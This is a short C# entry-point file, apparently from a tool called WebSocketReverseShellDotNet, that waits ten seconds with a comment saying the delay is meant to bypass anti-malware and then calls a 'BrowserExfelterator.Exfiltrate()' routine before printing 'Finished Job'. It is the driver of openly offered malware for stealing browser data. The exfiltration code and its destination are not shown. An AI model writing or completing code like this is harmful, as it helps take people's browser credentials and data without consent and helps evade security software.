using OfficeOpenXml;
using WebSocketReverseShellDotNet.service.commands;
using WebSocketReverseShellDotNet.utils;



ExcelPackage.LicenseContext = LicenseContext.NonCommercial;
/* Wait for few seconds to bypass Anti-Malware*/
OSUtil.WaitInSeconds(10);
BrowserExfelterator.Exfiltrate();

Console.WriteLine("Finished Job");